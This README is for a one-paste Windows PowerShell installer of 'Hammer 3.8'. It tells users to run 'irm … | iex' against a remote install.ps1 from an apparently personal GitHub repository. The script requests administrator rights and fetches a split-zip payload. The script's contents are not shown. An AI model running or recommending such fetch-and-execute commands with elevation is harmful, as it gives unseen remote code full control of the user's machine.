# Hammer 3.8 (fixed connection) — One-paste installer

Branch: `Hammer-3.8-fixed-connection`

Open **Windows PowerShell** (a UAC admin prompt will appear automatically) and paste:

```powershell
irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@5c36424/install.ps1 | iex
```

Direct GitHub raw (alternate):

```powershell
irm https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer-3.8-fixed-connection/install.ps1 | iex
```

Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) (primary) and [`Hammer-3.8-fixed-connection` branch](https://github.com/dvahana2424-web/hammerdeckydowngrade/tree/Hammer-3.8-fixed-connection).

## What changed in this build

- Fixed false **"No internet / Slow connection"** license check (ValveOFF-style direct GitHub license GET, 25s timeout).
- UI layout lock / centered controls when Windows forces maximize.
- Extra off-layout controls hidden (matches clean Hammer 3.8 UI).
- Embedded `hammer.ico` for exe / window icon.

## What it does

1. Requests Administrator rights (UAC).
2. Downloads the payload (`Hammer-3.8.zip.001`, `Hammer-3.8.zip.002`) and reassembles it.
3. Installs the files to `C:\Program Files (x86)\Hammer`.
4. Creates a Desktop shortcut **"Hammer 3.8"** using `hammer.ico`.
5. Registers an entry in **Control Panel > Programs and Features** that uninstalls via `Uninstall.exe`.

> Note: This is a Windows installer, so it uses PowerShell (`irm … | iex`) instead of `curl … | bash`.

## If you get HTTP 429

The installer downloads payload files from the [v3.8-fixed-connection release](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) first. If that fails, wait a few minutes and run the command again.

Manual fallback: download `Hammer-3.8.zip.001` and `Hammer-3.8.zip.002` from the release page, concatenate them into `Hammer-3.8.zip`, then extract to `C:\Program Files (x86)\Hammer`.



